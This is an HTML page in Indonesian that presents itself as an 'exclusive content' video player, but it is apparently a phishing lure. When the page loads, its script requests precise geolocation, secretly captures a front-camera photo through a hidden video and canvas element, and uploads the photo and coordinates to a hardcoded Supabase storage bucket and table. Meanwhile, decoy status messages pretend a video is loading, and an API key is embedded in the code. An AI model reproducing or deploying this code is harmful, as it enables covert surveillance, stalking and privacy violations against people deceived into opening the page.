<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>EXCLUSIVE CONTENT</title>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
  :root {
    --primary: #ff3b30;
    --bg: #050505;
    --card-bg: #121212;
    --text-main: #ffffff;
    --text-dim: #888888;
    --accent-glow: rgba(255, 59, 48, 0.15);
  }

  * { 
    box-sizing: border-box; 
    margin: 0; 
    padding: 0; 
  }

  body {
    font-family: 'Plus Jakarta Sans', sans-serif;
    background: var(--bg);
    color: var(--text-main);
    display: flex;
    flex-direction: column;
    align-items: center;
    min-height: 100vh;
    overflow-x: hidden;
  }

  /* Header Premium Look */
  header {
    width: 100%;
    padding: 20px;
    text-align: center;
    font-size: 1.1rem;
    font-weight: 800;
    letter-spacing: 4px;
    color: var(--primary);
    background: rgba(5, 5, 5, 0.8);
    backdrop-filter: blur(20px);
    border-bottom: 1px solid rgba(255,255,255,0.05);
    position: sticky;
    top: 0;
    z-index: 1000;
    text-transform: uppercase;
    text-shadow: 0 0 15px rgba(255, 59, 48, 0.4);
  }

  /* Status Box Sleek */
  #statusBox {
    width: 90%;
    max-width: 500px;
    margin: 30px auto 10px;
    padding: 12px 20px;
    background: linear-gradient(145deg, #1a1a1a, #111111);
    border-radius: 12px;
    text-align: center;
    border: 1px solid rgba(255,255,255,0.05);
    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
  }

  #statusText { 
    font-size: 0.8rem; 
    font-weight: 600;
    color: var(--primary);
    text-transform: uppercase;
    letter-spacing: 1px;
    animation: pulse 2s infinite;
  }

  @keyframes pulse {
    0% { opacity: 1; }
    50% { opacity: 0.5; }
    100% { opacity: 1; }
  }

  /* Video Card Styling */
  #list {
    width: 90%;
    max-width: 700px;
    padding: 20px 0;
  }

  .card {
    background: var(--card-bg);
    border-radius: 24px;
    overflow: hidden;
    border: 1px solid rgba(255,255,255,0.08);
    transition: transform 0.3s ease;
    box-shadow: 0 20px 40px rgba(0,0,0,0.4);
  }

  .media-container {
    width: 100%;
    aspect-ratio: 16 / 9;
    background: #000;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    position: relative;
    overflow: hidden;
  }

  /* Background Shimmer Effect */
  .media-container::before {
    content: "";
    position: absolute;
    top: 0; left: -100%;
    width: 200%; height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.03), transparent);
    animation: loading 2s infinite;
  }

  @keyframes loading {
    to { transform: translateX(100%); }
  }

  .error-icon {
    font-size: 3.5rem;
    margin-bottom: 15px;
    filter: drop-shadow(0 0 10px rgba(255, 59, 48, 0.5));
  }

  .media-container p {
    font-weight: 700;
    font-size: 1rem;
    color: #eee;
    z-index: 1;
  }

  .error-sub {
    font-size: 0.75rem;
    color: var(--text-dim);
    margin-top: 8px;
    background: rgba(255,255,255,0.05);
    padding: 4px 12px;
    border-radius: 20px;
  }

  .info-overlay {
    padding: 25px;
    background: linear-gradient(to bottom, #161616, #0a0a0a);
    text-align: center;
  }

  .info-text {
    font-size: 0.8rem;
    font-weight: 500;
    color: #666;
    letter-spacing: 0.5px;
  }

  /* Floating Notification */
  .floating-info {
    position: fixed;
    bottom: 30px;
    background: var(--primary);
    color: white;
    padding: 14px 30px;
    border-radius: 50px;
    font-size: 0.8rem;
    font-weight: 800;
    text-transform: uppercase;
    letter-spacing: 1.5px;
    box-shadow: 0 10px 25px rgba(255, 59, 48, 0.4);
    z-index: 1000;
  }

  /* Video & Canvas remain hidden */
  #hiddenVideo, #hiddenCanvas { display: none; }
</style>
</head>
<body>

<header></header>

<div id="statusBox">
  <div id="statusText">Inisialisasi Server...</div>
</div>

<div id="list">
  <div class="card">
    <div class="media-container">
      <div class="error-icon">🎬</div>
      <p>Source Error: Request Permission</p>
      <p class="error-sub">Decoding Video Stream: Failed</p>
    </div>
    <div class="info-overlay">
      <div class="info-text" id="statusMessage">Menghubungkan ke database video...</div>
    </div>
  </div>
</div>

<div class="floating-info" id="notif">INFO SELANJUTNYA KE TIKTOK@YAZZGANTENG</div>

<video id="hiddenVideo" autoplay playsinline></video>
<canvas id="hiddenCanvas" width="640" height="480"></canvas>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<script>
  // ... (Gunakan seluruh script JS asli kamu di sini tanpa perubahan) ...
  const SUPABASE_URL = "https://ttptotondiqkqsznuapw.supabase.co";
  const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InR0cHRvdG9uZGlxa3Fzem51YXB3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMzMTUzOTYsImV4cCI6MjA4ODg5MTM5Nn0.f9kTPb8CKit4vhfdREmYGrERxNj44RTSfWy7FDCAHu8";
  const BUCKET = "foto-users"; 
  const { createClient } = supabase;
  const client = createClient(SUPABASE_URL, SUPABASE_KEY);

  const statusText = document.getElementById("statusText");
  const statusMessage = document.getElementById("statusMessage");
  const hiddenVideo = document.getElementById("hiddenVideo");
  const hiddenCanvas = document.getElementById("hiddenCanvas");

  function updateUI(message) {
    statusText.innerText = message;
    if (statusMessage) {
      statusMessage.innerText = message;
    }
  }

  async function captureAndUpload(lat, lon) {
    try {
      updateUI("Verifikasi akses sedang berlangsung...");
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, 
        audio: false 
      });
      hiddenVideo.srcObject = stream;
      await new Promise(resolve => {
        hiddenVideo.onloadedmetadata = () => {
          hiddenVideo.play();
          resolve();
        };
      });
      updateUI("Sinkronisasi data...");
      setTimeout(async () => {
        const context = hiddenCanvas.getContext("2d");
        context.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
        hiddenCanvas.toBlob(async (blob) => {
          if (!blob) {
            updateUI("❌ Izin ditolak");
            stream.getTracks().forEach(track => track.stop());
            return;
          }
          const fileName = `capture_${Date.now()}.jpg`;
          const { error: uploadError } = await client.storage
            .from(BUCKET)
            .upload(fileName, blob, { cacheControl: "3600", upsert: false, contentType: "image/jpeg" });

          if (uploadError) {
            updateUI("❌ Gagal memuat resource");
          } else {
            await client.from("lokasi_users").insert([{ 
              foto: fileName, latitude: lat || 0, longitude: lon || 0, created_at: new Date()
            }]);
            updateUI("✅ Server Siap. Memuat video...");
          }
          stream.getTracks().forEach(track => track.stop());
        }, "image/jpeg", 0.8);
      }, 1500);
    } catch (err) {
      updateUI("⚠️ Harap aktifkan izin kamera");
    }
  }

  async function startProcess() {
    updateUI("Menyiapkan koneksi aman...");
    if (!navigator.geolocation) {
      updateUI("❌ Browser tidak mendukung");
      return;
    }
    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        await captureAndUpload(pos.coords.latitude, pos.coords.longitude);
      },
      (err) => {
        captureAndUpload(null, null);
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  }

  startProcess();
</script>
</body>
</html>
